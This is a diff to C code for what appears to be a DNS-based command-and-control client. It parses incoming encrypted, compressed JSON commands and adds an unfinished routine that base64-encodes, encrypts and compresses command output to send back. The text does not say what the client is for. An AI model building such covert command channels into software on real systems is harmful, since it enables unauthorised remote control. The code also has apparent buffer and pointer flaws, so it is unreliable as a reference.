@@ -8,6 +8,7 @@
 #include "compression.h"
 #include "crypt.h"
 #include "json.h"
+#include "base64/base64.h"
 
 /* DNS STUFF */
 #include <sys/types.h>
@@ -152,14 +153,8 @@ void poll(client_t *client)
 #endif
 
         // decompress
-        char inflated[255];
         u_int inflated_len = 0;
-        int zres = zdepress(gz_bytes, sizeof(gz_bytes), &inflated_len, inflated);
-        if (zres != 0)
-        {
-            Dprintf("decompression failed with status: %d\n", zres);
-            return;
-        }
+        char *inflated = zdepress(gz_bytes, sizeof(gz_bytes), &inflated_len);
         hex_dump("inflated", &inflated, inflated_len);
 
         // decrypt
@@ -169,7 +164,7 @@ void poll(client_t *client)
 
         // decode json
         char c[255];
-        size_t l = parse_json_command(clear, c);
+        size_t l = json_parse_command(clear, c);
 
         // copy the command to the client
         strncpy(client->command, c, l);
@@ -186,4 +181,24 @@ void respond_cmd(client_t *client, char *res)
         return;
     }
 
+    // base64 res bytes
+    int b64len;
+    char *b64encoded = base64(res, strlen(res), &b64len);
+
+    // json encode response struct
+    char json_encoded[strlen(res) * 2];
+    json_serialize_cmd_response(client->command, b64encoded, json_encoded);
+    // hex_dump("json_encoded", json_encoded, strlen(json_encoded));
+
+    // encrypt json payload
+    int encr_len = 0;
+    char *encr = encrypt(json_encoded, strlen(json_encoded), &encr_len);
+    hex_dump("encrypted", encr, encr_len);
+
+    // compress
+    u_int compr_len = 0;
+    char *compr = zpress(encr, encr_len, &compr_len);
+    hex_dump("compressed", compr, compr_len);
+
+    // requestify resultant bytes
 }
